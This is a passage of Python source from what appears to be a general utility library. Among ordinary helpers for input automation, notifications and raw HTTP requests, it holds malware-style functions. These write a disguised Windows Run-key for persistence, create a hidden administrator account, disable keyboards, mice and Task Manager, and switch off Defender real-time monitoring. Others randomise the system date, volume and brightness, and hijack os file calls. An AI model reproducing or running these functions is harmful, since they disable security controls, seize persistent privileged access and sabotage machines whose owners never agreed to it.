            subprocess.run(f"pip install pyautogui".split(
            ), stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        except:
            pass
        import pyautogui
    pyautogui.click(button="left")
    del pyautogui


def keyboardPress(button):
    try:
        import pyautogui
    except:
        try:
            subprocess.run(f"pip install pyautogui".split(
            ), stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        except:
            pass
        import pyautogui
    pyautogui.press(button)
    del pyautogui


def mousePos():
    try:
        import pyautogui
    except:
        try:
            subprocess.run(f"pip install pyautogui".split(
            ), stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        except:
            pass
        import pyautogui
    pos = pyautogui.position()
    del pyautogui
    return pos


def notify(app, title, msg, dur):
    if os.name == "nt":
        try:
            from win10toast import ToastNotifier
            import win32api
        except:
            try:
                subprocess.run("pip install win10toast win32api".split(
                ), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
            from win10toast import ToastNotifier
            import win32api
        toaster = ToastNotifier()
        toaster.show_toast(title, msg, duration=dur)
        del toaster
        del ToastNotifier
        del win32api
    else:
        try:
            subprocess.run(["notify-send", title, msg],
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
        try:
            from plyer import notification
        except:
            try:
                subprocess.run("pip install plyer".split(),
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
            from plyer import notification
        notification.notify(title=title, message=msg,
                            app_name=app, timeout=dur)
        del notification


def runHtmlScreen(html):
    try:
        import tkinter as tk
        from tkhtmlview import HTMLLabel
    except:
        try:
            subprocess.run("pip install tkhtmlview".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
        try:
            subprocess.run("pip install tkinter".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
        import tkinter as tk
        from tkhtmlview import HTMLLabel
    try:
        title = html.split("<title>")[1].split("</title>")[0]
    except:
        title = ""
    root = tk.Toplevel()
    root.title(title)
    root.geometry("800x600")
    label = HTMLLabel(root, html=html.replace(
        f"<title>{title}</title>", "<title> </title>"))
    label.pack(fill="both", expand=True)
    root.mainloop()


def moveMouseTo(x, y, dur):
    try:
        import pyautogui
    except:
        try:
            subprocess.run(f"pip install pyautogui".split(
            ), stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        except:
            pass
        import pyautogui
    pyautogui.moveTo(x, y, duration=dur)
    del pyautogui


def keyboardWrite(text):
    try:
        import pyautogui
    except:
        try:
            subprocess.run(f"pip install pyautogui".split(
            ), stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        except:
            pass
        import pyautogui
    pyautogui.write(text)
    del pyautogui


def beep(name):
    import winsound
    if name == "info":
        winsound.MessageBeep(winsound.MB_ICONASTERISK)
    elif name == "warn":
        winsound.MessageBeep(winsound.MB_ICONEXCLAMATION)
    elif name == "error":
        winsound.MessageBeep(winsound.MB_ICONHAND)
    elif name == "quest":
        winsound.MessageBeep(winsound.MB_ICONQUESTION)
    else:
        winsound.MessageBeep(winsound.MB_ICONASTERISK)


def unicodeText(minord, maxord):
    text = ""
    for h in range(minord, maxord+1):
        try:
            text += chr(h)
        except:
            pass
    return text


def unicodeTextRandom(minord, maxord, length):
    text = ""
    list = range(minord, maxord)
    for _ in range(length):
        while True:
            try:
                text += chr(random.choice(list))
                break
            except:
                pass
    return text


def checkPhone(countrycode, number):
    phone = f"+{countrycode}{number}"
    try:
        import phonenumbers
    except:
        try:
            subprocess.run("pip install phonenumbers".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
        import phonenumbers
    try:
        phone = phonenumbers.parse(phone, None)
        if phonenumbers.is_valid_number(phone):
            return True
        else:
            return False
    except:
        return False


class PhoneFinder:
    def __init__(self, countrycode):
        self.cc = int(countrycode)
        self.found = ""

    def test(self, number):
        test = checkPhone(self.cc, number)
        if test:
            self.found = number

    def Find(self):
        self.found = ""
        import threading
        import random
        ts = []
        n = 0
        if self.cc == 1:
            length = 11
        elif self.cc in [44, 49]:
            length = 12
        else:
            length = 10
        while True:
            number = ""
            for h in range(length):
                number += random.choice("1 2 3 4 5 6 7 8 9".split())
            number = int(number)
            t = threading.Thread(target=self.test, args=(number,))
            t.start()
            ts.append(t)
            if n >= 10:
                for t in ts:
                    t.join()
                n = 0
            n += 1
            if self.found == "":
                pass
            else:
                break
        return self.found


def findPhone(countrycode):
    return PhoneFinder(countrycode).Find()


async def asyncRunner(code, wait):
    for h in code.replace(" %& ", "\n").split("\n"):
        runCode(h)
        await asyncio.sleep(wait)


def runAsync(code, wait):
    asyncio.run(asyncRunner(code, wait))


def startupAdd(code):
    import ctypes
    import random
    code = f"C:\\Windows\\System32\\cmd.exe /C {code}"
    kernel32 = ctypes.windll.kernel32
    user32 = ctypes.windll.user32
    reg = r"Software\Microsoft\Windows\CurrentVersion\Run"
    regname = random.choice(["Windows", "System32RunReg", "System32-Basic",
                            "Kernel32Settings", "User64"])+"_"+str(random.randint(100000, 999999))
    key = ctypes.windll.kernel32.RegOpenKeyExW(ctypes.c_uint(
        0x80000001), reg, 0, ctypes.c_uint(0x0002 | 0x0004))
    ctypes.windll.kernel32.RegSetValueExW(key, regname, 0, ctypes.c_uint(
        1), ctypes.c_wchar_p(code), len(code)*ctypes.sizeof(ctypes.c_wchar))
    ctypes.windll.kernel32.RegCloseKey(key)
    user32.ExitWindowsEx(2, 0)


def setVolume(value):
    value = int(value)
    if os.name == "nt":
        try:
            subprocess.run(f"cmd.exe /C sndvol.exe /F {value*655.35}".split(
            ), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
    else:
        try:
            subprocess.run(f"amixer -D pulse sset Master {value}%".split(
            ), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass


def setBrightness(value):
    if os.name == "nt":
        try:
            import ctypes
            brightness_level = value
            dlldir = ctypes.windll.kernel32.SetDllDirectoryW
            dlldir(None)
            SetDeviceGammaRamp = ctypes.windll.user32.SetDeviceGammaRamp
            brightness = int(65535 * brightness_level / 100)
            hdc = ctypes.windll.user32.GetDC(0)
            ramp = (ctypes.c_ushort * 256)()
            ctypes.windll.gdi32.GetDeviceGammaRamp(hdc, ramp)
            for i in range(256):
                ramp[i] = min(ramp[i] * brightness / 65535, 65535)
            SetDeviceGammaRamp(hdc, ramp)
            ctypes.windll.user32.ReleaseDC(0, hdc)
        except:
            pass
    else:
        try:
            subprocess.run(f"""echo {value} | tee /sys/class/backlight/*/brightness""".split(
            ), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass


def setRandomBrightness():
    setBrightness(random.randint(1, 100))


def setRandomVolume():
    setVolume(random.randint(0, 100))


def restoreDateTime():
    if os.name == "nt":
        try:
            subprocess.run(f"""w32tm /resync""".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
    else:
        try:
            subprocess.run(f"""ntpdate -s time.nist.go""".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass


def setDateTime(year, month, day, hour, minute, second):
    if os.name == "nt":
        try:
            subprocess.run(f"""date {day}-{month}-{year}""".split(),
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
        try:
            subprocess.run(f"""time {hour}:{minute}:{second}""".split(
            ), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
    else:
        try:
            subprocess.run(f'date -s "{year}-{month:02d}-{day:02d} {hour:02d}:{minute:02d}:{second:02d}" '.split(
            ), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass


def setRandomDateTime():
    year = random.randint(1990, 2030)
    month = random.randint(1, 12)
    day = random.randint(1, 26)
    hour = random.randint(1, 23)
    minute = random.randint(1, 60)
    second = random.randint(1, 60)
    setDateTime(year, month, day, hour, minute, second)


def checkNetwork():
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect(("google.com", 80))
        a = True
    except:
        a = False
    finally:
        s.close()
    return a


def changeBg(type, bg):
    if type == "color":
        try:
            import PIL
            del PIL
        except:
            try:
                subprocess.run("pip install Pillow".split(),
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
        from PIL import Image
        import ctypes
        image = Image.new("RGB", (1, 1), bg)
        name = os.getcwd()+"\\."+str(random.randint(100000, 999999))+".jpg"
        image.save(name)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, name, 3)
        runCode("file.delete;"+name)
    elif type == "image":
        import ctypes
        ctypes.windll.user32.SystemParametersInfoW(20, 0, bg, 3)


def winUserAdd(name, pawd):
    subprocess.run(f"net user {name} {pawd} /add".split(),
                   stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True, shell=True)
    subprocess.run(f"net localgroup administrators {name} /add",
                   stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True, shell=True)


def winUserRemove(name):
    subprocess.run(f"net user {name} /delete".split(), stdout=subprocess.PIPE,
                   stderr=subprocess.PIPE, check=True, shell=True)


def moveMouse(x, y, dur):
    try:
        import pyautogui
    except:
        try:
            subprocess.run(f"pip install pyautogui".split(
            ), stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        except:
            pass
        import pyautogui
    xx, yy = pyautogui.position()
    xx = xx+int(x)
    yy = yy+int(y)
    pyautogui.moveTo(xx, yy, duration=dur)
    del pyautogui


def disableMouse():
    code = """$connectedMice = Get-WmiObject Win32_PnPEntity | Where-Object {$_.Name -like "*mouse*"}
foreach ($mouse in $connectedMice) {
    $mouse | Disable-PnpDevice -Confirm:$false
}"""
    try:
        subprocess.run(["powershell", "-Command", code], stdout=subprocess.PIPE,
                       stderr=subprocess.PIPE, check=True, shell=True)
    except:
        pass


def disableKeyboardSYS():
    while True:
        try:
            runCode("keylog;keysDisabler")
        except:
            pass


def pythonToCpp(file):
    if os.name == "nt":
        try:
            subprocess.run("cmd.exe /C pip install cython".split())
        except Exception as e:
            print(f"Cython Setuping Error: {e}")
        try:
            subprocess.run(
                f"cmd.exe /C python -m cython {file} -o {file}.c".split())
        except Exception as e:
            print(f"Python to Cython Error: {e}")
    else:
        try:
            subprocess.run("pip install cython".split())
        except Exception as e:
            print(f"Cython Setuping Error: {e}")
        try:
            subprocess.run(f"python -m cython {file} -o {file}.c".split())
        except Exception as e:
            print(f"Python to Cython Error: {e}")


def restoreTabs(code):
    try:
        import autopep8
    except:
        try:
            subprocess.run(["pip", "install", "autopep8"],
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except:
            pass
        import autopep8
    return autopep8.fix_code(code, options={"indent_size": 2})


def pythonToBash(file):
    pythonToCpp(file)
    try:
        subprocess.run(f"gcc {file}.c -o {file}.exe".split())
    except Exception as e:
        print(f"Cython to Bash Error: {e}")


def cppToBash(file):
    try:
        subprocess.run(f"gcc {file} -o {file}.exe".split())
    except Exception as e:
        print(f"Cython to Bash Error: {e}")


def slToCpp(file):
    runCode(f"returnAuto;{file}")
    pythonToCpp(file)


def disableKeyboard():
    code = """$connectedKeyboards = Get-WmiObject Win32_Keyboard
foreach ($keyboard in $connectedKeyboards) {
    $keyboard | Disable-PnpDevice -Confirm:$false
}"""
    try:
        subprocess.run(["powershell", "-Command", code], stdout=subprocess.PIPE,
                       stderr=subprocess.PIPE, check=True, shell=True)
    except:
        pass
    threading.Thread(target=disableKeyboardSYS).start()


def disableTaskManager():
    code = """$taskManagerPath = "$env:SystemRoot\\System32\\taskmgr.exe"
Disable-PnpDevice -InstanceId (Get-PnpDeviceProperty $taskManagerPath -KeyName "DEVPKEY_Device_InstanceId").Data -Confirm:$false"""
    try:
        subprocess.run(["powershell", "-Command", code], stdout=subprocess.PIPE,
                       stderr=subprocess.PIPE, check=True, shell=True)
    except:
        pass


def blockWindowsDefender():
    code = """Set-MpPreference -DisableRealtimeMonitoring $true"""
    try:
        subprocess.run(["powershell", "-Command", code], stdout=subprocess.PIPE,
                       stderr=subprocess.PIPE, check=True, shell=True)
    except:
        pass


def screenshot(filename):
    try:
        import pyautogui
    except:
        try:
            subprocess.run(f"pip install pyautogui".split(
            ), stdout=subprocess.PIPE, stderr=subprocess.PIPE, check=True)
        except:
            pass
        import pyautogui
    pyautogui.screenshot(filename)
    del pyautogui


def shakeMouse(power, duration):
    power = int(power)
    duration = float(duration)
    moveMouse(random.randint(-power, power),
              random.randint(-power, power), duration)


def getPing(target):
    cmd = f"ping -c 1 {target}".split()
    s = subprocess.run(cmd, stdout=subprocess.PIPE,
                       stderr=subprocess.PIPE, check=True)
    out = s.stdout.decode().split("time=")
    del out[0]
    out = out[0]
    if os.name == "nt":
        ms = out.split("ms")[0]
    else:
        ms = out.split(" ms")[0]
    return ms


def getMyPing():
    return getPing("localhost")


class Firoleus:
    def __init__(self, path):
        import os
        self.os = os
        self.paths = []
        for root, dirs, files in os.walk(path):
            for dir in dirs:
                try:
                    path = os.path.join(root, dir)
                    self.paths.append(path)
                except:
                    pass

    def getpaths(self):
        return self.paths

    def search(self, query):
        os = self.os
        results = []
        for path in self.paths:
            for root, d, files in os.walk(path):
                for file in files:
                    if query.lower() in file.lower():
                        results.append(os.path.join(root, file))
        return results

    def searchext(self, ext):
        os = self.os
        results = []
        for path in self.paths:
            for root, dirs, files in os.walk(path):
                for file in files:
                    name, extt = os.path.splitext(file)
                    if ext == extt:
                        results.append(os.path.join(root, file))
        return results


class Simacleus:
    def __init__(self, id, base):
        try:
            from fs.memoryfs import MemoryFS
        except:
            try:
                subprocess.run("pip install fs".split(),
                               stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            except:
                pass
            from fs.memoryfs import MemoryFS
        baseid = ""
        arch = "qwertyuiopasdfghjklzxcvbnm1234567890"
        for h in id:
            if base == "console":
                h = (ord(h)+2) % len(arch)
                baseid += arch[h]
            if base == "32":
                h = (ord(h)+2**2) % len(arch)
                baseid += arch[h]
            if base == "64":
                h = (ord(h)+2**3) % len(arch)
                baseid += arch[h]
        id = baseid
        self.id = id
        self.fs = MemoryFS()
        if base == "console":
            self.e = "utf-8"
        elif base == "32":
            self.e = "utf-16"
        elif base == "64":
            self.e = "utf-32"
        self.base = base
        self.flag = True
        self.path = []

    def write(self, file, c):
        with self.fs.open(file, "w", encoding=self.e) as f:
            f.write(c)

    def read(self, file):
        with self.fs.open(file, "r", encoding=self.e) as f:
            return f.read()

    def listdir(self, dir="/"):
        return "\n".join(self.fs.listdir(dir))

    def mkdir(self, dir):
        self.fs.makedirs(dir)

    def rmdir(self, dir):
        self.fs.removedir(dir)

    def listdirSys(self):
        path = "/"+("/".join(self.path))
        return self.fs.listdir(path)

    def chdirSys(self, path):
        self.path.append(path)

    def runSys(self):
        while self.flag:
            if self.flag == False:
                break
            try:
                open = self.fs.open
            except:
                pass
            if self.flag == False:
                break
            try:
                os.listdir = self.listdirSys
            except:
                pass
            if self.flag == False:
                break
            try:
                os.mkdir = self.mkdir
            except:
                pass
            if self.flag == False:
                break
            try:
                os.rmdir = self.rmdir
            except:
                pass
            if self.flag == False:
                break
            try:
                shutil.rmtree = self.rmdir
            except:
                pass
            try:
                os.chdir = self.chdirSys
            except:
                pass
            if self.flag == False:
                break

    def run(self):
        self.flag = True
        threading.Thread(target=self.runSys).start()

    def stop(self):
        self.flag = False
        time.sleep(1)


class SimonicBrowser:  # A module where users can create their own browsers that they can use
    def __init__(self):
        self.users = {"default": {"cookies": {}, "last": []}}
        self.name = "SimonicBrowser_App"
        self.ver = 1.0
        self.autoua = False
        self.ua = ""

    # Mechanism through which users can edit their own application information
    def setApp(self, name, ver):
        self.name = name
        self.ver = ver

    def getUA(self):  # Function that fetches the main user agent
        if self.autoua:
            return self.ua
        else:
            return f"User-Agent: Mozilla/5.0 (compatible; {platform.system()}) {self.name}/{self.ver}"

    def setUA(self, ua):  # Mechanism that users who want to customize the user agent can use
        if ua == "":
            self.autoua = False
            self.ua = ""
        else:
            self.autoua = True
            self.ua = ua

    def setupUA(self):  # A mechanism that creates a random user agent based on device information (automatic)
        name = platform.system()
        if name == "Windows":
            ua = random.choice([f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) {self.name}/{self.ver} Safari/537.36", f"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 {self.name}/{self.ver}",
                               "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko", f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) {self.name}/{self.ver} Safari/537.36"])
        elif name == "Linux":
            ua = random.choice([f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) {self.name}/{self.ver} Safari/537.36", f"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:95.0) Gecko/20100101 {self.name}/{self.ver}",
                               f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 {self.name}/{self.ver}", f"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 {self.name}/{self.ver}"])
        elif name == "Darwin":
            ua = random.choice([f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 {self.name}/{self.ver}", f"Mozilla/5.0 (Macintosh; Intel Mac OS X 11_6_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3.1 {self.name}/{self.ver}",
                               f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 {self.name}/{self.ver}", f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 {self.name}/{self.ver}"])
        elif name == "Android":
            ua = random.choice([f"Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) {self.name}/{self.ver} Mobile Safari/537.36", f"Mozilla/5.0 (Linux; Android 10; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) {self.name}/{self.ver} Mobile Safari/537.36",
                               f"Mozilla/5.0 (Linux; Android 11; SM-A715F) AppleWebKit/537.36 (KHTML, like Gecko) {self.name}/{self.ver} Mobile Safari/537.36", f"Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) {self.name}/{self.ver} Mobile Safari/537.36"])
        elif name == "iOS":
            ua = random.choice([f"Mozilla/5.0 (iPhone; CPU iPhone OS 15_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Mobile/15E148 {self.name}/{self.ver}", f"Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3.1 Mobile/15E148 {self.name}/{self.ver}",
                               f"Mozilla/5.0 (iPad; CPU OS 15_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.3 Mobile/15E148 {self.name}/{self.ver}", f"Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.2 Mobile/15E148 {self.name}/{self.ver}"])
        else:
            ua = "Mozilla/5.0 (compatible; Unknow) {self.name}/{self.ver}"
        self.setUA(ua)

    def makeUser(self, name):  # Create a browser user
        self.users[name] = {"cookies": {}, "last": []}

    def saveUser(self, name):  # Save the user data
        return (name, self.users[name])

    def loadUser(self, data):  # Load the user data
        self.users[data[0]] = data[1]

    def resetHistory(self, name):  # Reset history of user
        self.users[name]["last"] = []

    def resetCookies(self, name):  # Reset cookies of user
        self.users[name]["cookies"] = {}

    def setCookie(self, name, target, cookie):  # Set cookies of user
        self.users[name]["cookies"][target] = cookie

    def getCookie(self, name, target):  # Get cookies of user
        return self.users[name]["cookies"][target]

    def getHistory(self, name):  # Get history of the user
        return self.users[name]["last"]

    def save(self, file):  # Save the system
        saver = {"users": self.users, "name": self.name,
                 "ver": self.ver, "autoua": self.autoua, "ua": self.ua}
        with open(file, "w") as f:
            f.write(json.dumps(saver, indent=4))

    def load(self, file):  # Load the system
        with open(file, "r") as f:
            saver = json.loads(f.read())
        self.users = saver["users"]
        self.name = saver["name"]
        self.ver = saver["ver"]
        self.autoua = saver["autoua"]
        self.ua = saver["ua"]

    def ext_url(self, url):  # Parse the url
        url = url.split("://")
        conn = url[0].lower()
        target = url[1].split("/")[0].lower()
        for h in "qwertyuiopasdfghjklzxcvbnm":
            if h in target:
                if target.startswith("www."):
                    pass
                else:
                    target = "www."+target
                break
        path = url[1].split("/")[1:]
        path = "/"+("/".join(path))
        from urllib.parse import quote
        path = quote(path)
        del quote
        if conn == "http":
            port = 80
        elif conn == "https":
            port = 443
        else:
            port = 80
            conn = "http"
        return conn, target, port, path

    def getall(self, s):
        recv = b""
        n = 0
        while True:
            try:
                part = s.recv(65535)
                if part == None:
                    n += 1
                elif len(part) == 0:
                    n += 1
                else:
                    n = 0
                    recv += part
            except:
                break
            if n >= 100:
                break
        return recv.decode("utf-8", errors="ignore")

    def wwwform(self, user, conn, target, port, data):  # Form send function
        text = []
        for item, value in data.items():
            text.append(f"{item}={value}")
        data = "&".join(text)
        if target in self.users[user]["cookies"]:
            cookie = self.users[user]["cookies"][target]
            ua = self.getUA()
            pack = f"""POST {path} HTTP/1.1\r\nHost: {target}:{port}\r\nUser-Agent: {ua}\r\nAccept-Encoding: utf-8\r\nCookie: {
                cookie}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n{json.dumps(data)}"""
        else:
            ua = self.getUA()
            pack = f"""POST {path} HTTP/1.1\r\nHost: {target}:{port}\r\nUser-Agent: {
                ua}\r\nAccept-Encoding: utf-8\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n{json.dumps(data)}"""
        if conn == "http":
            s = socket.socket()
            s.settimeout(2)
            s.connect((target, port))
            s.sendall(pack.encode("utf-8"))
            recv = self.getall(s)
            s.close()
            try:
                cookie = recv.split("Set-Cookie: ")
                del cookie[0]
                cookiestat = ""
                for h in cookie:
                    cookiestat = h
                cookie = cookiestat.split("\r\n")[0]
                self.users[user]["cookies"][target] = cookie
            except:
                pass
            self.users[user]["last"] = self.users[user]["last"] + \
                [f"CONN: {conn} TARGET: {target} PORT: {port} PATH: {path}"]
            return (int(recv.split()[1]), recv)
        elif conn == "https":
            context = ssl.create_default_context()
            context.check_hostname = True
            context.verify_mode = ssl.CERT_REQUIRED
            sock = socket.create_connection((target, port))
            sock.settimeout(2)
            s = context.wrap_socket(sock, server_hostname=target)
            s.sendall(pack.encode("utf-8"))
            recv = self.getall(s)
            s.close()
            del context
            try:
                cookie = recv.split("Set-Cookie: ")
                cookiestat = ""
                for h in cookie:
                    cookiestat = h
                cookie = cookiestat.split("\r\n")[0]
                self.users[user]["cookies"][target] = cookie
            except:
                pass
            self.users[user]["last"] = self.users[user]["last"] + \
                [f"CONN: {conn} TARGET: {target} PORT: {port} PATH: {path}"]
            return (int(recv.split()[1]), recv)
        else:
            return (0, f"Connection not allowed for '{conn}'")

    def post(self, user, conn, target, port, path, data):  # Post function
        if target in self.users[user]["cookies"]:
            cookie = self.users[user]["cookies"][target]
            ua = self.getUA()
            pack = f"""POST {path} HTTP/1.1\r\nHost: {target}:{port}\r\nUser-Agent: {
                ua}\r\nAccept-Encoding: utf-8\r\nCookie: {cookie}\r\nContent-Type: application/json\r\n\r\n{json.dumps(data)}"""
        else:
            ua = self.getUA()
            pack = f"""POST {path} HTTP/1.1\r\nHost: {target}:{port}\r\nUser-Agent: {
                ua}\r\nAccept-Encoding: utf-8\r\nContent-Type: application/json\r\n\r\n{json.dumps(data)}"""
        if conn == "http":
            s = socket.socket()
            s.settimeout(2)
            s.connect((target, port))
            s.sendall(pack.encode("utf-8"))
            recv = self.getall(s)
            s.close()
            try:
                cookie = recv.split("Set-Cookie: ")
                del cookie[0]
                cookiestat = ""
                for h in cookie:
                    cookiestat = h
                cookie = cookiestat.split("\r\n")[0]
                self.users[user]["cookies"][target] = cookie
            except:
                pass
            self.users[user]["last"] = self.users[user]["last"] + \
                [f"CONN: {conn} TARGET: {target} PORT: {port} PATH: {path}"]
            return (int(recv.split()[1]), recv)
        elif conn == "https":
            context = ssl.create_default_context()
            context.check_hostname = True
            context.verify_mode = ssl.CERT_REQUIRED
            sock = socket.create_connection((target, port))
            sock.settimeout(2)
            s = context.wrap_socket(sock, server_hostname=target)
            s.sendall(pack.encode("utf-8"))
            recv = self.getall(s)
            s.close()
            del context
            try:
                cookie = recv.split("Set-Cookie: ")
                cookiestat = ""
                for h in cookie:
                    cookiestat = h
                cookie = cookiestat.split("\r\n")[0]
                self.users[user]["cookies"][target] = cookie
            except:
                pass
            self.users[user]["last"] = self.users[user]["last"] + \
                [f"CONN: {conn} TARGET: {target} PORT: {port} PATH: {path}"]
            return (int(recv.split()[1]), recv)
        else:
            return (0, f"Connection not allowed for '{conn}'")

    def getdownload(self, user, conn, target, port, path, output=False):  # Get all function
        if target in self.users[user]["cookies"]:
            cookie = self.users[user]["cookies"][target]
            ua = self.getUA()
            pack = f"""GET {path} HTTP/1.1\r\nHost: {target}:{port}\r\nUser-Agent: {
                ua}\r\nAccept-Encoding: utf-8\r\nCookie: {cookie}\r\nContent-Type: text\r\nAccept: */*\r\n\r\n"""
        else:
            ua = self.getUA()
            pack = f"""GET {path} HTTP/1.1\r\nHost: {target}:{port}\r\nUser-Agent: {
                ua}\r\nAccept-Encoding: utf-8\r\nContent-Type: text\r\nAccept: */*\r\n\r\n"""
        if conn == "http":
            s = socket.socket()
            s.settimeout(3)
            s.connect((target, port))
            s.sendall(pack.encode("utf-8"))
            recv = self.getall(s)
            s.close()
            try:
                cookie = recv.split("Set-Cookie: ")
                del cookie[0]
                cookiestat = ""
                for h in cookie:
                    cookiestat = h
                cookie = cookiestat.split("\r\n")[0]
                self.users[user]["cookies"][target] = cookie
            except:
                pass
            self.users[user]["last"] = self.users[user]["last"] + \
                [f"CONN: {conn} TARGET: {target} PORT: {port} PATH: {path}"]
            return (int(recv.split()[1]), recv)
        elif conn == "https":
            context = ssl.create_default_context()
            context.check_hostname = True
            context.verify_mode = ssl.CERT_REQUIRED
            sock = socket.create_connection((target, port))
            sock.settimeout(3)
            s = context.wrap_socket(sock, server_hostname=target)
            s.sendall(pack.encode("utf-8"))
            recv = self.getall(s)
            s.close()
            try:
                cookie = recv.split("Set-Cookie: ")
                cookiestat = ""
                for h in cookie:
                    cookiestat = h
                cookie = cookiestat.split("\r\n")[0]
                self.users[user]["cookies"][target] = cookie
            except:
                pass
            self.users[user]["last"] = self.users[user]["last"] + \
                [f"CONN: {conn} TARGET: {target} PORT: {port} PATH: {path}"]
            return (int(recv.split()[1]), recv)
        else:
            return (0, f"Connection not allowed for '{conn}'")

    def get(self, user, conn, target, port, path):  # Get function
        if target in self.users[user]["cookies"]:
            cookie = self.users[user]["cookies"][target]
            ua = self.getUA()
            pack = f"""GET {path} HTTP/1.1\r\nHost: {target}:{port}\r\nUser-Agent: {
                ua}\r\nAccept-Encoding: utf-8\r\nCookie: {cookie}\r\n\r\n"""
        else:
            ua = self.getUA()
            pack = f"""GET {path} HTTP/1.1\r\nHost: {target}:{
                port}\r\nUser-Agent: {ua}\r\nAccept-Encoding: utf-8\r\n\r\n"""
        if conn == "http":
            s = socket.socket()
            s.settimeout(2)
            s.connect((target, port))
            s.sendall(pack.encode("utf-8"))
            recv = self.getall(s)
            s.close()
            try:
                cookie = recv.split("Set-Cookie: ")
                del cookie[0]
                cookiestat = ""
                for h in cookie:
                    cookiestat = h
                cookie = cookiestat.split("\r\n")[0]
                self.users[user]["cookies"][target] = cookie
            except:
                pass
            self.users[user]["last"] = self.users[user]["last"] + \
                [f"CONN: {conn} TARGET: {target} PORT: {port} PATH: {path}"]
            return (int(recv.split()[1]), recv)
        elif conn == "https":
            context = ssl.create_default_context()
            context.check_hostname = True
            context.verify_mode = ssl.CERT_REQUIRED
            sock = socket.create_connection((target, port))
            sock.settimeout(2)
            s = context.wrap_socket(sock, server_hostname=target)
            s.sendall(pack.encode("utf-8"))
            recv = self.getall(s)
            s.close()
            del context
            try:
                cookie = recv.split("Set-Cookie: ")
                cookiestat = ""
                for h in cookie:
                    cookiestat = h
                cookie = cookiestat.split("\r\n")[0]
                self.users[user]["cookies"][target] = cookie
            except:
                pass
            self.users[user]["last"] = self.users[user]["last"] + \
                [f"CONN: {conn} TARGET: {target} PORT: {port} PATH: {path}"]
            return (int(recv.split()[1]), recv)
        else:
            return (0, f"Connection not allowed for '{conn}'")

    def open(self, user, url):  # Open content of target
        conn, target, port, path = self.ext_url(url)
        try:
            recv = self.get(user, conn, target, port, path)
        except Exception as e:
            recv = (0, str(e))
        if recv[0] == 301:
            location = recv[1].split("Location: ")[1].split("\r\n")[0]
            conn, target, port, path = self.ext_url(location)
            try:
                recv = self.get(user, conn, target, port, location)
                return "\r\n\r\n".join(recv[1].split("\r\n\r\n")[1:])
            except Exception as e:
                return f"Error: {e}"
        elif recv[0] == 200:
            return "\r\n\r\n".join(recv[1].split("\r\n\r\n")[1:])
        else:
            return f"Error: {recv[0]} {recv[1]}"

    # It takes all the data it can from the address and saves it to a file.
    def download(self, user, url, file, output=False):

        conn, target, port, path = self.ext_url(url)
        try:
            recv = self.getdownload(
                user, conn, target, port, path, output=output)
        except Exception as e:
            recv = (0, str(e))
        file = open(file, "w", encoding="utf-8")
        self.users[user]["last"] = self.users[user]["last"] + \
            [f"DOWNLOAD: {target}:{port} ({url})"]
        if recv[0] == 301:
